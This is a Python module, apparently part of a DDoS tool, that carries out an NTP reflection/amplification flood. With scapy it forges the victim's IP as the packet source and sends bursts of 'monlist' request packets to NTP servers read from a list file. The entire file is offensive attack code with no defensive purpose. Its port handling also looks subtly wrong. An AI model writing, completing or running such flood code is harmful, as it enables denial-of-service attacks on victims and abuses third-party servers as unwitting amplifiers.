import random
from scapy.all import IP, send, Raw, UDP
from socket import gaierror
from colorama import Fore
import os
SCRIPT_ROOT = os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(SCRIPT_ROOT, "ntp_servers.txt"), "r") as f:
    ntp_servers = f.readlines()
payload = "\x17\x00\x03\x2a" + "\x00" * 4
def flood(target):
    ntp_servers_path = os.path.join(SCRIPT_ROOT, 'ntp_servers.txt')
    with open(ntp_servers_path, "r") as f:
        servers = f.readlines()
    server = random.choice(servers)
    packets = random.randint(10, 150)
    server = server.replace("\n", "")
    try:
        packet = (
            IP(dst=server, src=target[0])
            / UDP(sport=random.randint(2000, 65535), dport=int(target[1]))
            / Raw(load=payload)
        )
        send(packet, count=packets, verbose=False)
    except gaierror:
        print(
            f"{Fore.RED}[!] {Fore.MAGENTA}NTP server {server} is offline!{Fore.RESET}"
        )
    except Exception as e:
        print(
            f"{Fore.MAGENTA}Error while sending NTP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
        )
    else:
        print(
            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} packets from NTP server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}"
        )